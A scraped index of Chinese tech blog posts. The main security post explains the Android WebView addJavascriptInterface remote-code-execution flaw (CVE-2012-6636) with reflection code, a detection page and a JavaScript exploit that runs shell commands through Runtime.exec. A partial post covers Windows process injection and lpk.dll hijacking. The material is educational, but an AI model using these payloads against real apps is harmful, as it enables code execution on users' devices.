Dynamic-Link Library Search Order http://msdn.microsoft.com/en-us/library/windows/desktop/ms682586(v=vs.85).aspx[8] https://bitbucket.org/Haroogan/vim-youcompleteme-for-windows/src/7dca764c2ee0?at=master[9] https://github.com/Valloric/YouCompleteMe/wiki/Windows-Installation-Guide[10] http://www.davidlenihan.com/2007/07/winsxs.html","link":"/cn/Windows_Rx034/"},{"title":"Android WebView 漏洞","text":"☆ 来自 developer.android.com 的信息Android 官方网站对addJavascriptInterface的介绍如下： 123456789101112public void addJavascriptInterface (Object object, String name) Added in API level 1Injects the supplied Java object into this WebView. The object is injected intothe JavaScript context of the main frame, using the supplied name. This allows the Java object's methods to be accessed from JavaScript. For applicationstargeted to API level JELLY_BEAN_MR1 and above, only public methods that are annotated with JavascriptInterface can be accessed from JavaScript. For applicationstargeted to API level JELLY_BEAN or below, all public methods (including the inherited ones)can be accessed, see the important security note below for implications.Note that injected objects will not appear in JavaScript until the page is next(re)loaded. For example: 123456789class JsObject { @JavascriptInterface public String toString() { return &quot;injectedObject&quot;; }}webView.addJavascriptInterface(new JsObject(), &quot;injectedObject&quot;);webView.loadData(&quot;&quot;, &quot;text/html&quot;, null);webView.loadUrl(&quot;javascript:alert(injectedObject.toString())&quot;); 12345678910111213141516171819This method can be used to allow JavaScript to control the host application. This is a powerful feature, but also presents a security risk for apps targetingJELLY_BEAN or earlier. Apps that target a version later than JELLY_BEAN are stillvulnerable if the app runs on a device running Android earlier than 4.2. The most secure way to use this method is to target JELLY_BEAN_MR1 and to ensure themethod is called only when running on Android 4.2 or later. With these older versions, JavaScript could use reflection to access an injected object's publicfields. Use of this method in a WebView containing untrusted content could allowan attacker to manipulate the host application in unintended ways, executing Java code with the permissions of the host application. Use extreme care when using this method in a WebView which could contain untrusted content.JavaScript interacts with Java object on a private, background thread of this WebView. Care is therefore required to maintain thread safety.The Java object's fields are not accessible.For applications targeted to API level LOLLIPOP and above, methods of injected Java objects are enumerable from JavaScript. Parameters object the Java object to inject into this WebView's JavaScript context. Null values are ignored.name the name used to expose the object in JavaScript 之所以提供addJavascriptInterface是为了WebView中的Javascript可以和本地的App 通讯，这确实是一个很强大的功能，这么做的好处在于本地App逻辑不变的情况下，不 需要升级App就可以对程序进行更新，修改相应的Web页面就可以了。 ☆ 相关知识WebView的使用方法 在layout中定义 , 在Activity的onCreate中加入下面的代码 123WebView webview = new WebView(this);setContentView(webview);webview.loadUrl(&quot;http://slashdot.org/&quot;); Java Reflection 反射是java语言提供的一种机制，使Java程序可以在运行时检查类、接口、方法和成员，而不需要在编译的时候知道类的名字和方法等细节信息。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546package Reflect;import java.lang.reflect.Method;class Demo {public void a1() {}public void a2() {}}class hello {public static void main(String[] args) { Demo demo=new Demo(); Class mObjectClass = demo.getClass(); System.out.println(mObjectClass.getName()); Method[] methods = mObjectClass.getMethods(); for(Method method : methods){ System.out.println(&quot;method = &quot; + method.getName()); } try { Class c = mObjectClass.forName(&quot;java.lang.Runtime&quot;); Method m = c.getMethod(&quot;getRuntime&quot;, null); m.setAccessible(true); Object obj = m.invoke(null, null); Class c2 = obj.getClass(); String[] array = {&quot;/bin/sh&quot;, &quot;-c&quot;, &quot;id &gt; /tmp/id&quot;}; Method n = c2.getMethod(&quot;exec&quot;, array.getClass()); n.invoke(obj, new Object[]{array}); } catch (Throwable e) { System.out.println(e.toString()); }}} 运行结果: 123456789101112131415&gt; javac -d . Reflect/hello.java&gt; java Reflect.helloReflect.Demomethod = a2method = a1method = waitmethod = waitmethod = waitmethod = equalsmethod = toStringmethod = hashCodemethod = getClassmethod = notifymethod = notifyAll 命令执行成功。 通过reflection 访问private123456789101112131415161718192021222324252627282930313233343536373839404142package Reflect;import java.lang.reflect.Method;class Demo {private void a1() { System.out.println(&quot;I am a1&quot;);}public void a2() { System.out.println(&quot;I am a2&quot;);}}class hello {public static void main(String[] args) { Demo demo=new Demo(); Class mObjectClass = demo.getClass(); System.out.println(mObjectClass.getName()); Method[] methods = mObjectClass.getDeclaredMethods(); for(Method method : methods){ System.out.println(&quot;method = &quot; + method.getName()); } try { Object o = mObjectClass.newInstance(); methods[0].setAccessible(true); methods[0].invoke(o); } catch (Throwable e) { }}} 运行结果： 1234567&gt; javac -d . Reflect/hello.java&gt; java Reflect.helloReflect.Demomethod = a1method = a2I am a1 已经成功调用了Demo的private a1 方法 ☆ 相关漏洞CVE-2013-4710Disney Mobile、eAccess、KDDI、NTT DOCOMO、SoftBank设备上的Android 3.0至4.1.x版本中存在安全漏洞，该漏洞源于程序没有正确实现WebView类。远程攻击者可借助特制的网页利用该漏洞执行任意Java对象的方法或造成拒绝服务（重启） CVE-2012-6636 (关键的CVE)该漏洞源于程序没有正确限制使用WebView.addJavascriptInterface方法，远程攻击者可通过使用Java Reflection 利用该漏洞执行任意Java对象的方法。影响使用 API Level 16以及之前的Android 系统。(Android 4.2 为 API Level 17) CVE-2014-1939 searchBoxJavaBridge_ in Android Jelly Bean此漏洞公布了一个可利用的Java Object “searchBoxJavaBridge_” CVE-2014-7224根据 android/webkit/AccessibilityInjector.java 代码中的介绍，发现当系统辅助功能中的任意一项服务被开启后，所有由系统提供的WebView都会被加入两个JS objects，分别为是”accessibility” 和 “accessibilityTraversal”。如果APP使用了系统的WebView并且设置了setJavaScriptEnabled()，那么恶意攻击者就可以使用”accessibility” 和“accessibilityTraversal” 这两个Java Bridge来执行远程攻击代码 分析 这些CVE中最核心的是CVE-2012-6636, 出现的问题是接口定义问题。是非常经典的do a 变成 do b 的例子，后面的修复方法也是保证了do a 就是 do a。 ☆ 漏洞检测 使用WebView访问下面页面，输出的接口名称则存在漏洞。 12345678910111213141516171819202122232425262728293031323334&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;UTF-8&quot; /&gt;&lt;title&gt;WebView漏洞检测&lt;/title&gt;&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0,maximum-scale=1.0, user-scalable=0&quot;&gt;&lt;/head&gt;&lt;body&gt;&lt;p&gt;&lt;b&gt;如果当前app存在漏洞，将会在页面中输出存在漏洞的接口方便程序员做出修改：&lt;/b&gt;&lt;/p&gt;&lt;script type=&quot;text/javascript&quot;&gt;function check(){ for (var obj in window) { try { if (&quot;getClass&quot; in window[obj]) { try{ window[obj].getClass(); document.write('&lt;span style=&quot;color:red&quot;&gt;'+obj+'&lt;/span&gt;'); document.write('&lt;br /&gt;'); }catch(e){ } } } catch(e) { } }}check();&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 现代浏览器都实现基本一致的BOM，使得JavaScript和浏览器进行消息传递。 是否有getClass的方法，可以作为检测WebView漏洞依据。 在Android 4.1.1 原生系统上测试，在默认配置下，存在 searchBoxJavaBridge_ 可以利用，CVE-2014-7224上的两个接口，并没有成功暴露。看了源代码后发现必须 打开Accessibility 设置中的Enhance Web accessibility 才会暴露这个两个接口， 因此CVE-2014-7224的影响并不像想象中的那么大。 ☆ 漏洞利用的方法1234567&lt;script&gt;function execute(cmd){ returnwindow.jsinterface.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec(cmd);}execute(['/system/bin/sh','-c','echo \\&quot;mwr\\&quot; &gt; /mnt/sdcard/mwr.txt']);&lt;/script&gt; jsinterface是导出的Java对象， 测试成功，权限是app 的用户权限。 ☆ 修复方法和现状 Google宣布不为小于Android 4.4 的系统提供WebView补丁, 具体可以参见链接： https://community.rapid7.com/community/metasploit/blog/2015/01/11/google-no-longer-provides-patches-for-webview-jelly-bean-and-prior 要解决WebView的RCE漏洞，比较靠谱的方法是升级Android系统，至少要升级到 API level 17 (Android 4.2), WebView 除了最严重的RCE漏洞，还有各种SOP漏洞，所 以至少要升级到Android 4.4才能保证安全，小于Android 4.4 Google不提供补丁。 Android 4.4 以后使用以chrome为基础的WebView。 升级系统API level 17后，只有显示添加 @JavascriptInterface的方法才能被JavaScript 调用，这样反射就失去作用了。 123removeJavascriptInterface(&quot;accessibility&quot;);removeJavascriptInterface(&quot;accessibilityTraversal&quot;);removeJavascriptInterface(&quot;searchBoxJavaBridge_&quot;); ☆ 参考链接 http://developer.android.com/guide/webapps/webview.html http://developer.android.com/reference/android/webkit/WebView.html https://daoyuan14.github.io/news/newattackvector.html http://droidsploit.baidu.com/view/14100201.html http://www.rafayhackingarticles.net/2014/10/a-tale-of-another-sop-bypass-in-android.html http://tutorials.jenkov.com/java-reflection/index.html http://javaxden.blogspot.sg/2007/08/hack-any-java-class-using-reflection.html http://www.programcreek.com/2013/09/java-reflection-tutorial/ https://labs.mwrinfosecurity.com/blog/2012/04/23/adventures-with-android-webviews/ https://labs.mwrinfosecurity.com/advisories/2013/09/24/webview-addjavascriptinterface-remote-code-execution/ ☆ 思考 WebView 中还提供了一个方法让我们可以获得控制的机会 123456@Overridepublic boolean shouldOverrideUrlLoading(WebView view, String url) { if (url.substring(0,6).equalsIgnoreCase(&quot;yourscheme:&quot;)) { // parse the URL object and execute functions }} 如果使用上面的代码，在网页的javascript中添加下面的代码，就可以进入后面的解析 URL流程，如果后续代码没有进行严格的检查可能会有一些其他的安全问题。 1window.location = yourscheme://method?parameter=value Google对这个方法的解释如下： 1234567Give the host application a chance to take over the control when a new url is about to be loaded in the current WebView. If WebViewClient is not provided, by default WebView will ask Activity Manager to choose the proper handler for the url. If WebViewClient is provided, return true means the host application handles the url, while return false means the current WebView handles the url. This method is not called for requests using the POST &quot;method&quot;. 其实就是当WebView加载新的URL时给App程序一个控制的机会，这还是有一些想象空间的。","link":"/cn/webview_java/"},{"title":"Fedora 安装 vnc server","text":"因为疫情，现在公司启用远程办公了，不得已在工作机上开了vncserver，这篇文档做个记录。 (1) 安装1sudo dnf install tigervnc-server (2) 创建服务1cp /lib/systemd/system/vncserver@.service /etc/systemd/system/vncserver@.service 编辑 /etc/systemd/system/vncserver@.service 替换下面两行的USER为实际用户名 12ExecStart=/sbin/runuser -l USER -c &quot;/usr/bin/vncserver %i -geometry 1280x1024&quot;PIDFile=/home/USER/.vnc/%H%i.pid 执行命令 systemctl daemon-reload 使用vpnpasswd修改密码 1234~]# su - USER~]$ vncpasswdPassword:Verify: 启动vncserver的命令行 1sudo systemctl start vncserver@:1 参考文档： https://docs.fedoraproject.org/en-US/Fedora/21/html/System_Administrators_Guide/ch-TigerVNC.html (3)直接调用命令行使用上面的方法过于繁琐，可以直接调用 vncserver 的命令行 vncserver :2 -geometry 1920x1080 -depth 24 (4) 改变vnc的默认桌面vim ~/.vnc/xstartup 1234567#!/bin/shunset SESSION_MANAGERunset DBUS_SESSION_BUS_ADDRESS#exec /etc/X11/xinit/xinitrcexec /bin/sh /etc/xdg/xfce4/xinitrc 必须改变默认桌面，要不可能登录不进去。 其他个人觉得从安全角度看，使用命令启用 vncserver 是比较合理的，要用了就打开，用完就关。另外vncserver 连接加了一层 tunnel，安全无小事。","link":"/cn/vnc/"},{"title":"vim 输入特殊字符","text":"vim 的编辑能力确实很强，今天说一下如何在vim中输入特殊字符，比如音标、unicode 字符。 http://vimhelp.appspot.com/digraph.txt.htmlhttp://vimhelp.appspot.com/insert.txt.html#i_CTRL-V_digit 关键就在上面两篇，可能许多人不喜欢看复杂的文章，我这里简单介绍一下用法。 输入音标 ə i 进入编辑模式 CTRL-vu0259那如何知道 ə 的 unicode hex number 是 0259呢，在vim的normal 模式下，将光标移动到ə输入ga 输入 ⇒ i 进入编辑模式 CTRL-k=&gt;:dig 可以看到支持这种方法输入的unicode 字符","link":"/cn/vim_special_char/"},{"title":"ThunerBird 78.8.1 连接 TLS 1.0 失败问题和 Linux 乱谈","text":"我在公司使用 Linux 作用主力机已经 10 多年了，自从抛弃 Ubuntu 转入 Fedora 怀抱，生活幸福了不少。早年最大的问题是 OFFICE 软件，工作中少不了要和 doc、ppx，xls 打交道，又没有太好的软件可以使用。刚开始基本就两个解决方案，wine office 和永中 OFFICE，这两个方案都不是太理想，wine 的速度很慢，永中则兼容性比较差，还会出现文档格式看起来就有明显差异的情况。。 随着金山 wps 的发展，现在 OFFICE 的问题基本解决，作为轻度 EXCEL 使用者基本已经满足需求了。Linux现在主要问题是字体渲染比较差，中文经常看起来发虚，如果能把这个问题彻底解决就非常不错了。作为Linux老用户，各种魔改后，也能较好使用了，但后面发现还是换个显示器更管用。要解决中文显示问题，有两个字体很管用，文泉驿微米黒和微软雅黑，实践证明把系统字体用上面两个字体替换，显示效果也就好了不少了。 Ubuntu Linux 最大的问题就是不太稳定，基本每次大版本升级显示都要挂，弄得我都有点心理阴影了，原来周围还挺多同学使用 Linux，最终放弃了，一个直接用 Windows 了，还有一个 Windows 上跑一个 Linux 虚拟机。Ubuntu 还有个坏习惯喜欢乱改，upstart，Unity等，后面都没有成为主流，bug 就更不用说了，经常挺闹心的。 Fedora 从近些年的使用情况来看，还是很不错的，网络中流传是 Redhat Linux Enterprise 的小白版本，但是其实只要 bug 修得快，你大概率是感觉不到的。遇上问题，放狗一搜就会发现 redhat 已经有 bug 在处理中了，于是乎就有了今天这篇。 在升级到 Fedara 33 和 ThunderBird 78 后，使用 TLS 连接公司的 ExChange 邮件服务器就连不上了。我们公司的内网安全审核非常严格，邮件不使用加密连接要限时整改。放狗一搜发现，大批人员都遇上了相同的问题，也有人给出了解决方案。 https://support.mozilla.org/en-US/questions/1295861 1234I think this could be due to the minimum version of TLS supported by TB 78. The release notes state that versions lower than 1.2 are disabled, so if your server only supports v. 1.1, you might be able to fix sending by changing the preference security.tls.version.min to 2 from the default 3, in Config. editor. https://www.thunderbird.net/en-US/thunderbird/78.0/releasenotes/ 1TLS 1.0 and 1.1 disabled 如何开启 TLS 1.0， mozilla 也给出了相应的方案 https://support.mozilla.org/en-US/kb/thunderbird-78-faq#w_how-to-enable-outdated-security-protocols-tls-1-0-and-1-1 123456789101112131415How to enable outdated security protocols TLS 1.0 and 1.1Open Config Editor (about:config)≡ &gt; Preferences &gt; Find in PreferencesIn the searchbox, type: about:config, then press Enter.Click on the button Config Editor… in the search result.In the about:config dialog, search for: security.tls.version.minDouble-click on the found preference security.tls.version.min and change its value to 1, then press Enter.Restart Thunderbird and try to download your messages.If you can receive and/or send your messages after changing this preference:Please inform your email provider to upgrade the security protocols on the server to support TLS 1.2.Revert the preference security.tls.version.min to its original value as soon as possible by repeating the above procedure, then right-click on the preference and choose Reset from the context menu. 看上去解决方案很简单，在 Preferences 中的搜索框里输入 about:config 点击进入，将其中的security.tls.version.min 设置为 1 就好了，但是在 Fedora 34 中不起作用。我用 wireshark 抓了包看，ThunderBird 自己报告不支持的协议版本。我仔细研究了一下 ThunderBird 相关的 config 项有下面几个： 123security.tls.version.minsecurity.tls.version.enable-deprecatedsecurity.tls.version.fallback-limit 我把这几个选项都设置了一下，分别设置为 1 true 1，还是不管用。 在 Fedora 33 上这个问题就没解决，这都 Fedora 34 了，所以又花了时间研究了一下。没好办法，放狗，运气不错，看到了这篇 https://bugzilla.mozilla.org/show_bug.cgi?id=1674092#c11 原来 Fedora 还有个 StrongCryptoSettings ，看文档可以修改 123update-crypto-policies --set DEFAULT:FEDORA32update-crypto-policies --set LEGACYreboot 关键的内容就是下面这几行 cat /etc/crypto-policies/state/CURRENT.pol 12min_tls_version = TLS1.2protocol = TLS1.3 TLS1.2 DTLS1.2 执行后变为 12min_tls_version = TLS1.0protocol = TLS1.3 TLS1.2 TLS1.1 TLS1.0 DTLS1.2 DTLS1.0 重启系统后，又可以开心地使用 ThunderBird 了 ^_^","link":"/cn/thunderbird.tls.1.0/"},{"title":"VIM + SVN 管理","text":"公司使用svn管理源代码，避免不了要和svn打交道，有几个比较好的解决方案。 1. vcscommand.vimhttp://www.vim.org/scripts/script.php?script_id=90 这个插件的特点是支持的版本管理工具多,支持git，svn等常见版本管理工具。vcscommand.vim插件默认绑定了无差别的快捷键，使用起来非常方便。 12345678910111213141516|&lt;Leader&gt;|ca VCSAdd|&lt;Leader&gt;|cn VCSAnnotate|&lt;Leader&gt;|cN VCSAnnotate!|&lt;Leader&gt;|cc VCSCommit|&lt;Leader&gt;|cD VCSDelete|&lt;Leader&gt;|cd VCSDiff|&lt;Leader&gt;|cg VCSGotoOriginal|&lt;Leader&gt;|cG VCSGotoOriginal!|&lt;Leader&gt;|ci VCSInfo|&lt;Leader&gt;|cl VCSLog|&lt;Leader&gt;|cL VCSLock|&lt;Leader&gt;|cr VCSReview|&lt;Leader&gt;|cs VCSStatus|&lt;Leader&gt;|cu VCSUpdate|&lt;Leader&gt;|cU VCSUnlock|&lt;Leader&gt;|cv VCSVimDiff 这个 &lt;Leader&gt; 得看你定义了什么快捷键，vim 默认的是 \\ 2. vim-unite-svn小日本写的unite.vim的svn插件，unite.vim 是一个非常不错的vim插件，它的作用是 为vim 写简单界面，要使用vim-unite-svn首先需要安装unite.vim 插件，折腾这个插件的原因是vcscommand.vim有些不太好的地方。 buffer管理的不太好 status 比较弱 羡慕emacs的vc mode的体验 https://github.com/Shougo/unite.vim 小日本写的 vim-unite-svn 插件太久没有更新了，有一些bug，我修改了一下，用了一段时间暂时没有发现什么问题。 https://github.com/henices/vim-unite-svn 支持基本的svn命令， svn status, svn info, svn diff, svn commit, svn up 使用示例 123:Unite svn/status:Unite svn/diff:Unite svn/blame","link":"/cn/svn_vim/"},{"title":"个人炒股经历","text":"本人IT男一枚，2015年入市，到今天5年多了，所幸还在吃人不露骨头的市场上活着，也是非常不容易。基本不存在什么特殊情况，韭菜总是在人声鼎沸的牛市高点入场，本人也不例外，上证3500多点入市，上证3800多点让媳妇买了沪深 300 基金 （不是ETF），这基金今年才解套，小赚出局了。 运气好的是，2015年的时候中了一支新股，新股的收益对冲了倒金字塔加仓的回撤，小赚1万元出局清了仓，有时候我也在想如果不是这赚了1万，是不是也就不会继续炒股了。接下来的事情大家都很熟悉了，熔断和股灾3.0，一直在不赚和小亏中挣扎着，居然也坚持了下来。理工男的特质救了我，从2015年开始认真学习股票操作，恶补基础知识，分时，K线，缺口，价量关系，缠论，波浪理论，箱体理论，趋势交易，价值投资，基本各种理论都看了遍，其实到最后发现有用的东西太少了，关于股票的书也基本没啥用，真正有用的书可能就那么几本，可是如果不看几十本的话，你怎么知道哪几本有用呢？所以炒股并不存在什么捷径，一夜暴富基本是神话，为啥呢？盈亏同源，怎么赚钱就可能怎么亏回去，除非你知道你为什么能赚钱。 下面是这些年的心得，应该可以涨几年功力吧？ 要在市场上生存你必须具备某种优势，没有这种优势就是纯赌博，真正赚钱的是要做大概率的投机。买卖股票实际上是对股票做分类，哪些可以做，哪些不可以做，这就涉及了股票交易系统，有了交易系统，剩下的就是执行问题了，要做到BDWQ，后面就是仓位计算，根据股票的波动和你愿意承担的风险程度计算出来。 回首看虽然现在稳定盈利了，又回到了灵魂拷问，投入的时间值得吗？对于很多人来说，最重要可能是资金的原始积累，10万块，翻10倍，100万在中国很多城市一套房也买不了，更不用说财富自由了，所以先努力工作吧，边工作边加大投资比例，梦想还是要有的，万一实现了呢？","link":"/cn/stock_experience/"},{"title":"市场情绪指标","text":"可以量化一下，有时间考虑程序实现。 涨/跌停板数 涨停封版成功率 涨跌股票比率 大盘成交量额 融资余额情况 北向资金净流入 （参考）","link":"/cn/stock_emotion/"},{"title":"SSD 迁移记","text":"由于某些需求，决定上SSD，提高一下硬盘读写速度。上二手东买了三星(SAMSUNG) 860 EVO最初的想法是作为数据盘使用，即操作系统还是跑在机械硬盘上，仔细一思考，还是折腾一下，要不实在是有些浪费，事实证明，折腾是值得的，感觉就想飞一样。 首先查看一下原始的情况： 1234$ mount/dev/sda1 on /boot type ext4 (rw,relatime,seclabel,stripe=4)/dev/mapper/fedora-root on / type ext4 (rw,relatime,seclabel) 当然首先要把SSD处理一下，安装一下 gparted 图形化界面很好用。建个分区表，选择gpt，分个区，/dev/mapper/fedora-root 大小为50G，先分个50G的分区，剩下的全部给另外一个分区，格式化为 ext4。操作完成后，用fdisk 查看一下： 123456789101112$ fdisk -lDisk /dev/sdb：232.9 GiB，250059350016 字节，488397168 个扇区单元：扇区 / 1 * 512 = 512 字节扇区大小(逻辑/物理)：512 字节 / 512 字节I/O 大小(最小/最佳)：512 字节 / 512 字节磁盘标签类型：gpt磁盘标识符：设备 起点 末尾 扇区 大小 类型/dev/sdb1 2048 104859647 104857600 50G Linux 文件系统/dev/sdb2 104859648 488396799 383537152 182.9G Linux 文件系统 将原来系统的 / dd 到新的SSD， 1dd if=/dev/mapper/fedora-root of=/dev/sdb1 bs=1M 用新的root 把系统启动起来，reboot 后进入引导界面，按e 编译，找到root=/dev/fedora/root 改为 root=/dev/sdb1 按 ctrl+x 启动，一会儿就进系统了，速度提升很大。现在需要把 grub.cfg 更新一下，因为我们是手动修改进入了新的根，如果重启的话，还是会使用老的根，因为grub.cfg 里就是这么写的。 要生成新的grub.cfg 需要使用grub2-mkconfig, 命令很简单 $ grub2-mkconfig -o /boot/grub2/grub.cfg 执行后重启，md 怎么又进到老根去了。这里折腾了好久，第一个问题fedora 的内核出bug了，每次重启都要等待非常久的时间，所以需要升级，所以正确的顺序应该是先升级系统再dd，没办法升级系统重新 dd 解决了fedora 内核的问题后，发现还是进不到新根。只要认真地看 grub.cfg, grub2 改动挺大，不太熟悉了。 1234# # DO NOT EDIT THIS FILE # # It is automatically generated by grub2-mkconfig using templates # from /etc/grub.d and settings from /etc/default/grub 启动有两个信息，确实是使用 grub2-mkconfig 生成，/etc/default/grub 里有配置 12345678910$ cat /etc/default/grubGRUB_TIMEOUT=5GRUB_DISTRIBUTOR=&quot;$(sed 's, release .*$,,g' /etc/system-release)&quot;GRUB_DEFAULT=savedGRUB_DISABLE_SUBMENU=trueGRUB_TERMINAL_OUTPUT=&quot;console&quot;GRUB_CMDLINE_LINUX=&quot;rd.driver.blacklist=nouveau modprobe.blacklist=nouveau nvidia-drm.modeset=1 rd.lvm.lv=fedora/root rd.lvm.lv=fedora/swap rhgb quiet&quot; GRUB_DISABLE_RECOVERY=&quot;true&quot; grub2-mkconfig 里用这句 1GRUB_DEVICE=&quot;`${grub_probe} --target=device /`&quot; 执行查看结果， 发现正确 123$ grub2-probe --target=device //dev/sdb1 可是为什么不能正确启动呢，看看生成的 grub.cfg 文件 linux16 /vmlinuz-4.17.2-200.fc28.x86_64 root=UUID=290a98e3-7937-49db-a971-4d0e49567cf0 使用的是 UUID，并不是 /dev, 查看一下各分区的 uuid 1234# blkid/dev/sdb1: UUID=&quot;290a98e3-7937-49db-a971-4d0e49567cf0&quot; TYPE=&quot;ext4&quot; PARTUUID=&quot;fe64f395-7520-42c3-939b-b17eb7064cec&quot;/dev/mapper/fedora-root: UUID=&quot;290a98e3-7937-49db-a971-4d0e49567cf0&quot; TYPE=&quot;ext4&quot; 由于dd 的原因，/dev/sdb1 和 /dev/mapper/fedora-root 的 UUID 居然是相同的。第一个想法是把/dev/sdb1 的 UUID 给改了。放狗搜发现有下面的方法 1234$ uuidgen 8e4c27b2-c63e-4d1d-8ac4-5ddd90669eb0tune2fs /dev/{device} -U {uuid} 可是tune2fs 时报错，死活改不过来。lzx 提示可以看看如何是grub.cfg 不使用uuid，发现有个参数 GRUB_DISABLE_UUID=true， 在 /etc/default/grub 加上这行，重新生成grub.cfg 重启，一切 OK 进入到SSD 的新root 有的系统上的参数可能不太一样，ubuntu 系统里这个参数好像的是 GRUB_DISABLE_LINUX_UUID=true可能需要确认一下。 EOF","link":"/cn/ssd/"},{"title":"root Pixel2 Android 11 的方法","text":"要正常使用 frida 首先需要把手机给 root 了， 在最近测试的情况发现 Android 10 和 Android 11 系统工作比较正常， Android 6和其他系统似乎差一些？ 要刷机首先需要下载 adb 等工具，这些工具由 Android 的 SDK platform tools 提供，下载地址为：https://developer.android.com/studio/releases/platform-tools选择相应的操作系统版本下载即可， Google 提供了 Windows、Linux、Mac 等系统的支持。 基础镜像可以选择的 Google 的官方镜像 Factory Image，如果能自己编译 Android 系统则更好，在调试的时候可以看到系统库的符号。 我的 Android 手机为 Pixel 2 在 https://developers.google.com/android/images#walleye 上可以查找相应的镜像， 下个最新的 https://dl.google.com/dl/android/aosp/walleye-rp1a.201005.004.a1-factory-0c23f6cf.zip 要想刷镜像前提条件是先要解锁 bootloader， Pixel2 新手机解锁的命令和以前有变化，可以参考 https://source.android.com/devices/bootloader/locking_unlocking 12adb reboot bootloaderfastboot flashing unlock_critical 下载解压后，里面有个 flash-all 的脚本，将手机重启到 fastboot 模式后可以直接运行， adb reboot bootloader， 重启到 fastboot 模式后，执行 flash-all 脚本，刷机系统镜像就完成了。 以前 root Android 用的都是 SuperSU 和 TWRP， 这次使用了一个不同的方法 Magisk ， 安装的方法参见：https://topjohnwu.github.io/Magisk/install.html 有两种模式， patch boot 或者 patch recovery， 安装 Magisk app 后如果界面显示 Ramdisk：Yes，则需要 patch boot。Magisk app 的下载地址 https://github.com/topjohnwu/Magisk/releases/download/v23.0/Magisk-v23.0.apk 安装 Magisk app 后， 选择需要 patch 的镜像文件，选择后会自动生成新的修改过后的镜像文件。获得修改后的镜像文件后，需要将修改后的镜像文件重新刷一次 1fastboot flash boot /path/to/magisk_patched.img #or fastboot flash recovery /path/to/magisk_patched.img 刷完新的修改后的镜像，重启系统，Root 就完成了。","link":"/cn/root_android11_pixel2/"},{"title":"How to request a RESERVED CVE","text":"在申请 CVE 过程中会遇到一个问题，向软件官方提交漏洞修复后，由于软件官方不是CNA 无法直接分配CVE，而申请CVE 通常需要一个软件官方确认的链接，而有些比较正规的软件在漏洞修复之前是不会有公开链接的，这就无法申请CVE了。 有点鸡生蛋，蛋生鸡的感觉。解决这个问题的办法是申请一个 RESERVED CVE。 申请 RESERVED CVE 方法申请 RESERVED CVE，也是需要填写的CVE 申请表格的 https://cveform.mitre.org/，选择 Request CVE ID 根据提示的重要信息： 12345IMPORTANT: Once a CVE ID is assigned to your vulnerability, it will not be published in the CVE List until you have submitted a URL pointing to public information about the vulnerability. Without a public reference, the CVE ID will display as &quot;RESERVED&quot; in the CVE List. Please update CVE with a reference to the vulnerability's details as soon as possible. See this FAQ for more information. 只要将 public reference 留空，就可以申请 RESERVED CVE 了。CVE 官方收到请求后会有确认的邮件。 CVE 官方分配 CVE IDCVE 官方收到 RESERVED CVE 请求后，会给分配一个 CVE ID，但是状态为 ** RESERVED ** ，不会有公开细节。 RESERVED CVE 申请公开当软件官方确认已经修复漏洞，并且发布新版后，可以通知 CVE 官方更新 CVE 的状态。还是通过填写 https://cveform.mitre.org/ 表格，选择 Notify CVE about a publication，填写相关信息。 一些注意事项 将 cve-request@mitre.org 和 cve@mitre.org 加入邮件白名单 （有可能邮件会被截拦） 在申请公开步骤中，CVE 官方有可能和你要公开披露的链接，如果软件官方不给写，可以自己写一个 披露要求的信息： 12345[CVE ID][PRODUCT][VERSION][PROBLEM TYPE][DESCRIPTION]","link":"/cn/request_RESERVED_CVE/"},{"title":"Python 多版本使用 pip","text":"Q：Fedora 31 提供的 Python3.7， 想使用 Python3.8， 用系统的pip3 只会给 Python3.7 安装库，如何解决 A: 12curl -O https://bootstrap.pypa.io/get-pip.pypython3.8 get-pip.py 执行上面命令后，会在 /usr/local/bin/ 下生成和 pip 相关的脚本，把这些脚本删除，要不可能会和系统的 pip3 冲突。接下来就可以使用下面的命令行安装 Python3.8 的库 python3.8 -m pip install pyhash --user 在安装过程中可能会因为众所周知的原因导致网络出错，备好梯子即可。","link":"/cn/python_pip/"},{"title":"Windows 进程注入","text":"1. Process Injection 方法总结 进程注入是windows病毒和恶意软件最常用的手法之一，Windows下进程注入的方法比较多，这里介绍常见的一些方法，以及相应的检查手段。 1.1 SetWindowsHookEx SetWindowsHookEx估计是大家最熟悉的方法了，这个是微软提供给我们使用正规用法。往Windows的hook chain中安装hook 例程，监控系统某种类型的event, 使用这种方法需要实现一个dll。 123456HHOOK WINAPI SetWindowsHookEx( _In_ int idHook, _In_ HOOKPROC lpfn, _In_ HINSTANCE hMod, _In_ DWORD dwThreadId); dwThread 为0，将监管系统中所有线程。 idHook 指定监控event的类型 hMod dll句柄 lpfn hook例程的指针 MSDN给出了一个使用的例子： 123456789101112HOOKPROC hkprcSysMsg;static HINSTANCE hinstDLL; static HHOOK hhookSysMsg; hinstDLL = LoadLibrary(TEXT(&quot;c:\\\\myapp\\\\sysmsg.dll&quot;)); hkprcSysMsg = (HOOKPROC)GetProcAddress(hinstDLL, &quot;SysMessageProc&quot;); hhookSysMsg = SetWindowsHookEx( WH_SYSMSGFILTER, hkprcSysMsg, hinstDLL, 0); 值得一提的是这个API只能监控GUI程序，console的程序是监控不了。当年使用的时候还吃了亏。 1.2 lpk.dll 这是一种比较常见的方法，一般把这种方法称为 dll 劫持 (dll hijack),lpk.dll默认的位置在，如果在其他的路径发现lpk.dll就需要需要注意了。 这种方法需要实现和原始的lpk.dll一样导出函数，每个函数都转向调用真正的lpk.dll中的导出函数，这样对于程序来说是完全感觉不到什么异常变化的，但是却被伪造的lpk.dll过了一道，所以称为为劫持。 这里有二个问题，值得思考。 如何能让程序加载我们的lpk.dll而不是系统真正的dll 如果知道Windows查找dll的顺序，就很容易解决这个问题了，微软的MSDN网站很贴心地 回答了我们的问题。 http://msdn.microsoft.com/en-us/library/windows/desktop/ms682586(v=vs.85).aspx 123456789a. The directory from which the application loaded.b. The current directory.c. The system directory. Use the GetSystemDirectory function to get the path of this directory.d. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched.e. The Windows directory. Use the GetWindowsDirectory function to get the path of this directory.f. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the App Paths registry key. The App Paths key is not used when computing the DLL search path. 因此把lpk.dll放到运行的程序同一目录即可。 为什么选取lpk.dll Windows 7 开始，默认已经不加载LPK.dll了，要Windows 7 默认加载LPK.dll 